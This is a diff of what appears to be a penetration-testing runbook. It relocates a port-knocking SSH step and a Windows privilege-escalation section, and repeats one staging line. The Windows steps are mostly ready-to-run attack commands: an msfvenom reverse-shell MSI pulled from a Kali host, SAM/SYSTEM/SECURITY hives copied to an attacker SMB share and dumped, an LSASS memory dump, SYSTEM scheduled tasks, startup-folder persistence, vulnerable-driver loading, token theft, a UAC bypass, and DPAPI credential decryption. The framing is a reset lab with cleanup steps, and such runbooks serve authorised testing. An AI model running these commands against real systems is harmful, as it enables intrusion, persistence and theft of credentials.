@@ -357,6 +357,39 @@ hostname; id; uname -s
 | Login denied | **PASS-03** against `ssh://` with that name, or **NET-05** when no username is suspected. |
 | Logged in but host or identity unverified | **EXP-03**. |
 
+## SSH-03. Use an observed opening sequence, then close that access
+
+Enter when a read at WREAD-01 or LNX-07 supplied the host's actual knock sequence and you may change its firewall.
+
+Record both event blocks: ordered ports and protocols, `seq_timeout`, flags, action and the opening/closing pair for the exact SSH port. Unknown flags or one-time sequences go to **PAUSE-COVERAGE**.
+
+Check the baseline from the same client:
+
+```bash
+ip route get '<TARGET_IP>'
+nmap -n -Pn -sT -p '<SSH_PORT>' --max-retries 1 --host-timeout 15s '<TARGET_IP>'
+```
+
+If already open, go to **SSH-01** without knocking. Otherwise send the opening sequence once:
+
+```bash
+knock -4 -v -d '<DELAY_MS>' '<TARGET_IP>' '<PORT1>:tcp' '<PORT2>:tcp' '<PORT3>:tcp'
+nmap -n -Pn -sT -p '<SSH_PORT>' --max-retries 1 --host-timeout 15s '<TARGET_IP>'
+```
+
+| Result | Next |
+| --- | --- |
+| Port opens | **SSH-01**, then **SSH-02**. |
+| Still closed or scan incomplete | Send the closing sequence once, then **PAUSE-COVERAGE**. |
+| Route changed | **PAUSE-RECOVERY**. |
+
+After SSH work, exit your shells, recheck the route and send the actual closing sequence once. Verify the port is filtered again.
+
+| Result | Next |
+| --- | --- |
+| Port returns to the closed baseline | Continue the workflow. |
+| Port open or baseline unconfirmed | **PAUSE-RECOVERY**. |
+
 # http
 
 
@@ -933,6 +966,12 @@ KRB5CCNAME='<CCACHE>' impacket-mssqlclient -windows-auth -k -no-pass '<DOMAIN>/<
 
 # windows
 
+Stage the reviewed driver/loader, Incognito, UACME and SharpDPAPI binaries.
+
+Stage the reviewed driver/loader, Incognito, UACME and SharpDPAPI binaries.
+
+Disposable lab with a reset. WIN-01 must confirm host and architecture, WIN-07 both policy hives.
+
 ## WIN-01. Identify this Windows shell
 
 Enter when: you have a new Windows shell or changed token.
@@ -1254,6 +1293,220 @@ On Kali: `chisel server --reverse --port '<PORT>'`, then `nmap -sT -Pn -p '<LOCA
 | Port open, protocol unknown | **GAP-SERVICE**. |
 | Port does not close | **PAUSE-RECOVERY**. |
 | Forwarded service lives on another internal host | **PIVOT-01**. |
+
+## WPRIV-01. Does the enabled installer policy yield the intended Windows token?
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f msi -o proof.msi
+sha256sum proof.msi
+python3 -m http.server '<HTTP_PORT>' --bind '<KALI_IP>'
+```
+
+```powershell
+New-Item -ItemType Directory -Path 'C:\Users\Public\owb-msi' -ErrorAction Stop
+Invoke-WebRequest -Uri 'http://<KALI_IP>:<HTTP_PORT>/proof.msi' -OutFile 'C:\Users\Public\owb-msi\proof.msi'
+(Get-FileHash -LiteralPath 'C:\Users\Public\owb-msi\proof.msi' -Algorithm SHA256).Hash
+```
+
+Start `ncat --listen '<KALI_IP>' '<LPORT>'` in a second terminal, then install:
+
+```powershell
+msiexec.exe /i 'C:\Users\Public\owb-msi\proof.msi' /qn /norestart
+```
+
+In the callback: `hostname; whoami /all`.
+
+| Result | Next |
+| --- | --- |
+| Assigned host and higher token | **WIN-01**. |
+| Original token | **PAUSE-COVERAGE**. |
+| No callback or installer error | **PAUSE-COVERAGE**. |
+| Unexpected installed state | **PAUSE-RECOVERY**. |
+
+Cleanup: read the install log, remove the MSI and log, remove the directory, and delete the local MSI.
+
+## WPRIV-02. Can SeBackupPrivilege read the registry hives?
+
+With the privilege enabled, copy the hives with backup semantics:
+
+```cmd
+robocopy /b C:\Windows\System32\config C:\Windows\Temp\owb-backup SAM SYSTEM SECURITY
+```
+
+Serve a local SMB share on Kali and pull the three hives:
+
+```bash
+impacket-smbserver owb . -smb2support
+```
+
+```cmd
+copy C:\Windows\Temp\owb-backup\SAM \\<KALI_IP>\owb\
+copy C:\Windows\Temp\owb-backup\SYSTEM \\<KALI_IP>\owb\
+copy C:\Windows\Temp\owb-backup\SECURITY \\<KALI_IP>\owb\
+```
+
+```bash
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+```
+
+| Result | Next |
+| --- | --- |
+| Local account hashes extracted | **PASS-02** or pass-the-hash at **AD-03** with `-H`. |
+| Copy denied despite the privilege | Recheck the token at **WIN-01**. |
+| Hive copy incomplete | **PAUSE-COVERAGE**. |
+
+Remove the three Windows hives, the Kali copies, and stop the SMB server afterwards.
+
+## WPRIV-03. Can SeTakeOwnershipPrivilege open one protected file?
+
+```cmd
+takeown /f "<FILE_PATH>"
+icacls "<FILE_PATH>" /grant "<USERNAME>:F"
+type "<FILE_PATH>"
+```
+
+Change `/grant` to a group only when the file must stay readable for others.
+
+| Result | Next |
+| --- | --- |
+| File readable | **WIN-03** if it is a credential source, otherwise **NET-05**. |
+| Still denied | Check the token and the file ACL again at **WIN-01**. |
+| Path missing | **PAUSE-COVERAGE**. |
+
+Restore ownership only if the task changed a system file: `icacls "<FILE_PATH>" /setowner "NT SERVICE\TrustedInstaller"`.
+
+## WPRIV-04. Can SeDebugPrivilege dump LSASS?
+
+```powershell
+Get-Process lsass | Select-Object -ExpandProperty Id
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
+```
+
+Pull the dump and parse it on Kali:
+
+```bash
+pypykatz lsa minidump lsass.dmp
+```
+
+| Result | Next |
+| --- | --- |
+| Credential material recovered | **PASS-02**, or **AD-03** with a hash. |
+| Dump fails or is truncated | **PAUSE-COVERAGE**; check the PID and path. |
+| No material | Record the extent; **WIN-02**. |
+
+Delete `lsass.dmp` on both sides after parsing.
+
+## WPRIV-05. Can an elevated task run as SYSTEM?
+
+```cmd
+schtasks /create /tn owb /tr "cmd /c <COMMAND>" /sc once /st 23:59 /ru SYSTEM
+schtasks /run /tn owb
+schtasks /delete /tn owb /f
+```
+
+Use a command that writes proof, such as `whoami /all > C:\Windows\Temp\owb.txt`.
+
+| Result | Next |
+| --- | --- |
+| Output shows SYSTEM | **WIN-01** on the new context, or use the output as proof. |
+| Create denied | Need an elevated token; **WIN-02**. |
+| Task runs, no output | **PAUSE-COVERAGE**. |
+
+Remove the output file after reading it.
+
+## WPRIV-06. Can a startup folder launch your file?
+
+```powershell
+Copy-Item 'C:\Users\Public\payload.exe' "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\owb.exe"
+```
+
+Another administrator must sign in for the file to run.
+
+| Result | Next |
+| --- | --- |
+| Process runs after logon | **WIN-01**. |
+| Nothing starts | Check the folder ACL and the logon event; **PAUSE-COVERAGE**. |
+
+Delete the file when done.
+
+## WPRIV-07. Is a reviewed driver loadable with SeLoadDriverPrivilege?
+
+Enter with the privilege, an elevated token and a reviewed vulnerable driver and loader.
+
+```cmd
+sc.exe create owbdrv type= kernel binPath= C:\Windows\Temp\driver.sys
+sc.exe start owbdrv
+sc.exe query owbdrv
+```
+
+Run the reviewed loader against the loaded driver, then remove it:
+
+```cmd
+sc.exe stop owbdrv
+sc.exe delete owbdrv
+```
+
+| Result | Next |
+| --- | --- |
+| Driver loads and the loader returns a token | **WIN-01** in that context. |
+| `sc` denies the load | Check integrity and path; **WIN-01**. |
+| Loader fails | **EXP-01** for the driver/loader pair. |
+
+## WPRIV-08. Are SeCreateToken or SeAssignPrimaryToken usable?
+
+Enter with either privilege and an existing high-value token.
+
+```cmd
+incognito.exe list_tokens -u
+incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
+```
+
+`SeTcbPrivilege` alone is not enough to mint a token; use it with a reviewed token tool.
+
+| Result | Next |
+| --- | --- |
+| SYSTEM shell | **WIN-01**. |
+| Token listed but execute denied | Check the exact privilege; **PAUSE-COVERAGE**. |
+| No token listed | **WIN-02**. |
+
+## WPRIV-09. Is UAC standing between an admin token and elevation?
+
+```cmd
+whoami /groups | findstr /i "Label"
+```
+
+A Medium mandatory label while the account is in Administrators means filtered admin. Run a reviewed UACME build:
+
+```cmd
+Akagi64.exe 23 C:\Windows\System32\cmd.exe
+```
+
+| Result | Next |
+| --- | --- |
+| High-integrity shell | **WIN-01**. |
+| Still Medium | Try another method ID once; **PAUSE-COVERAGE**. |
+| Account is not admin | **WIN-02**. |
+
+## WPRIV-10. Can DPAPI credentials be decrypted?
+
+```cmd
+dir /a "%APPDATA%\Microsoft\Credentials"
+dir /a "%LOCALAPPDATA%\Microsoft\Credentials"
+```
+
+With the current user's context, parse one file with a reviewed tool:
+
+```cmd
+SharpDPAPI.exe credentials /target:%APPDATA%\Microsoft\Credentials\<FILE>
+```
+
+Mimikatz equivalent: `dpapi::cred /in:"<FILE>"`. A masterkey is needed for a different user.
+
+| Result | Next |
+| --- | --- |
+| Plaintext credential | **AD-03** or **WIN-10**. |
+| Blob needs another user's masterkey | Record the file; **GAP-ACCESS**. |
+| No files | **WIN-03**. |
 
 # adcs
 
@@ -1921,264 +2174,6 @@ curl -sS --get 'http://<TARGET_IP>/<LFI_ENDPOINT>' --data-urlencode '<FILE_PARAM
 | `SAVE` fails | Restore, then **LNX-04** from a shell. |
 
 Restore `dir`, `dbfilename` and `rdbcompression`, `DEL owb_php_<ID>`, and remove the `.rdb` through `system.exec`, then return to **REXP-03**.
-
-# ssh_knock
-
-## SSH-03. Use an observed opening sequence, then close that access
-
-Enter when a read at WREAD-01 or LNX-07 supplied the host's actual knock sequence and you may change its firewall.
-
-Record both event blocks: ordered ports and protocols, `seq_timeout`, flags, action and the opening/closing pair for the exact SSH port. Unknown flags or one-time sequences go to **PAUSE-COVERAGE**.
-
-Check the baseline from the same client:
-
-```bash
-ip route get '<TARGET_IP>'
-nmap -n -Pn -sT -p '<SSH_PORT>' --max-retries 1 --host-timeout 15s '<TARGET_IP>'
-```
-
-If already open, go to **SSH-01** without knocking. Otherwise send the opening sequence once:
-
-```bash
-knock -4 -v -d '<DELAY_MS>' '<TARGET_IP>' '<PORT1>:tcp' '<PORT2>:tcp' '<PORT3>:tcp'
-nmap -n -Pn -sT -p '<SSH_PORT>' --max-retries 1 --host-timeout 15s '<TARGET_IP>'
-```
-
-| Result | Next |
-| --- | --- |
-| Port opens | **SSH-01**, then **SSH-02**. |
-| Still closed or scan incomplete | Send the closing sequence once, then **PAUSE-COVERAGE**. |
-| Route changed | **PAUSE-RECOVERY**. |
-
-After SSH work, exit your shells, recheck the route and send the actual closing sequence once. Verify the port is filtered again.
-
-| Result | Next |
-| --- | --- |
-| Port returns to the closed baseline | Continue the workflow. |
-| Port open or baseline unconfirmed | **PAUSE-RECOVERY**. |
-
-# windows_privilege
-
-
-Stage the reviewed driver/loader, Incognito, UACME and SharpDPAPI binaries.
-
-Stage the reviewed driver/loader, Incognito, UACME and SharpDPAPI binaries.
-
-Disposable lab with a reset. WIN-01 must confirm host and architecture, WIN-07 both policy hives.
-
-## WPRIV-01. Does the enabled installer policy yield the intended Windows token?
-
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST='<KALI_IP>' LPORT='<LPORT>' -f msi -o proof.msi
-sha256sum proof.msi
-python3 -m http.server '<HTTP_PORT>' --bind '<KALI_IP>'
-```
-
-```powershell
-New-Item -ItemType Directory -Path 'C:\Users\Public\owb-msi' -ErrorAction Stop
-Invoke-WebRequest -Uri 'http://<KALI_IP>:<HTTP_PORT>/proof.msi' -OutFile 'C:\Users\Public\owb-msi\proof.msi'
-(Get-FileHash -LiteralPath 'C:\Users\Public\owb-msi\proof.msi' -Algorithm SHA256).Hash
-```
-
-Start `ncat --listen '<KALI_IP>' '<LPORT>'` in a second terminal, then install:
-
-```powershell
-msiexec.exe /i 'C:\Users\Public\owb-msi\proof.msi' /qn /norestart
-```
-
-In the callback: `hostname; whoami /all`.
-
-| Result | Next |
-| --- | --- |
-| Assigned host and higher token | **WIN-01**. |
-| Original token | **PAUSE-COVERAGE**. |
-| No callback or installer error | **PAUSE-COVERAGE**. |
-| Unexpected installed state | **PAUSE-RECOVERY**. |
-
-Cleanup: read the install log, remove the MSI and log, remove the directory, and delete the local MSI.
-
-## WPRIV-02. Can SeBackupPrivilege read the registry hives?
-
-With the privilege enabled, copy the hives with backup semantics:
-
-```cmd
-robocopy /b C:\Windows\System32\config C:\Windows\Temp\owb-backup SAM SYSTEM SECURITY
-```
-
-Serve a local SMB share on Kali and pull the three hives:
-
-```bash
-impacket-smbserver owb . -smb2support
-```
-
-```cmd
-copy C:\Windows\Temp\owb-backup\SAM \\<KALI_IP>\owb\
-copy C:\Windows\Temp\owb-backup\SYSTEM \\<KALI_IP>\owb\
-copy C:\Windows\Temp\owb-backup\SECURITY \\<KALI_IP>\owb\
-```
-
-```bash
-impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
-```
-
-| Result | Next |
-| --- | --- |
-| Local account hashes extracted | **PASS-02** or pass-the-hash at **AD-03** with `-H`. |
-| Copy denied despite the privilege | Recheck the token at **WIN-01**. |
-| Hive copy incomplete | **PAUSE-COVERAGE**. |
-
-Remove the three Windows hives, the Kali copies, and stop the SMB server afterwards.
-
-## WPRIV-03. Can SeTakeOwnershipPrivilege open one protected file?
-
-```cmd
-takeown /f "<FILE_PATH>"
-icacls "<FILE_PATH>" /grant "<USERNAME>:F"
-type "<FILE_PATH>"
-```
-
-Change `/grant` to a group only when the file must stay readable for others.
-
-| Result | Next |
-| --- | --- |
-| File readable | **WIN-03** if it is a credential source, otherwise **NET-05**. |
-| Still denied | Check the token and the file ACL again at **WIN-01**. |
-| Path missing | **PAUSE-COVERAGE**. |
-
-Restore ownership only if the task changed a system file: `icacls "<FILE_PATH>" /setowner "NT SERVICE\TrustedInstaller"`.
-
-## WPRIV-04. Can SeDebugPrivilege dump LSASS?
-
-```powershell
-Get-Process lsass | Select-Object -ExpandProperty Id
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
-```
-
-Pull the dump and parse it on Kali:
-
-```bash
-pypykatz lsa minidump lsass.dmp
-```
-
-| Result | Next |
-| --- | --- |
-| Credential material recovered | **PASS-02**, or **AD-03** with a hash. |
-| Dump fails or is truncated | **PAUSE-COVERAGE**; check the PID and path. |
-| No material | Record the extent; **WIN-02**. |
-
-Delete `lsass.dmp` on both sides after parsing.
-
-## WPRIV-05. Can an elevated task run as SYSTEM?
-
-```cmd
-schtasks /create /tn owb /tr "cmd /c <COMMAND>" /sc once /st 23:59 /ru SYSTEM
-schtasks /run /tn owb
-schtasks /delete /tn owb /f
-```
-
-Use a command that writes proof, such as `whoami /all > C:\Windows\Temp\owb.txt`.
-
-| Result | Next |
-| --- | --- |
-| Output shows SYSTEM | **WIN-01** on the new context, or use the output as proof. |
-| Create denied | Need an elevated token; **WIN-02**. |
-| Task runs, no output | **PAUSE-COVERAGE**. |
-
-Remove the output file after reading it.
-
-## WPRIV-06. Can a startup folder launch your file?
-
-```powershell
-Copy-Item 'C:\Users\Public\payload.exe' "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\owb.exe"
-```
-
-Another administrator must sign in for the file to run.
-
-| Result | Next |
-| --- | --- |
-| Process runs after logon | **WIN-01**. |
-| Nothing starts | Check the folder ACL and the logon event; **PAUSE-COVERAGE**. |
-
-Delete the file when done.
-
-## WPRIV-07. Is a reviewed driver loadable with SeLoadDriverPrivilege?
-
-Enter with the privilege, an elevated token and a reviewed vulnerable driver and loader.
-
-```cmd
-sc.exe create owbdrv type= kernel binPath= C:\Windows\Temp\driver.sys
-sc.exe start owbdrv
-sc.exe query owbdrv
-```
-
-Run the reviewed loader against the loaded driver, then remove it:
-
-```cmd
-sc.exe stop owbdrv
-sc.exe delete owbdrv
-```
-
-| Result | Next |
-| --- | --- |
-| Driver loads and the loader returns a token | **WIN-01** in that context. |
-| `sc` denies the load | Check integrity and path; **WIN-01**. |
-| Loader fails | **EXP-01** for the driver/loader pair. |
-
-## WPRIV-08. Are SeCreateToken or SeAssignPrimaryToken usable?
-
-Enter with either privilege and an existing high-value token.
-
-```cmd
-incognito.exe list_tokens -u
-incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
-```
-
-`SeTcbPrivilege` alone is not enough to mint a token; use it with a reviewed token tool.
-
-| Result | Next |
-| --- | --- |
-| SYSTEM shell | **WIN-01**. |
-| Token listed but execute denied | Check the exact privilege; **PAUSE-COVERAGE**. |
-| No token listed | **WIN-02**. |
-
-## WPRIV-09. Is UAC standing between an admin token and elevation?
-
-```cmd
-whoami /groups | findstr /i "Label"
-```
-
-A Medium mandatory label while the account is in Administrators means filtered admin. Run a reviewed UACME build:
-
-```cmd
-Akagi64.exe 23 C:\Windows\System32\cmd.exe
-```
-
-| Result | Next |
-| --- | --- |
-| High-integrity shell | **WIN-01**. |
-| Still Medium | Try another method ID once; **PAUSE-COVERAGE**. |
-| Account is not admin | **WIN-02**. |
-
-## WPRIV-10. Can DPAPI credentials be decrypted?
-
-```cmd
-dir /a "%APPDATA%\Microsoft\Credentials"
-dir /a "%LOCALAPPDATA%\Microsoft\Credentials"
-```
-
-With the current user's context, parse one file with a reviewed tool:
-
-```cmd
-SharpDPAPI.exe credentials /target:%APPDATA%\Microsoft\Credentials\<FILE>
-```
-
-Mimikatz equivalent: `dpapi::cred /in:"<FILE>"`. A masterkey is needed for a different user.
-
-| Result | Next |
-| --- | --- |
-| Plaintext credential | **AD-03** or **WIN-10**. |
-| Blob needs another user's masterkey | Record the file; **GAP-ACCESS**. |
-| No files | **WIN-03**. |
 
 # dns
 
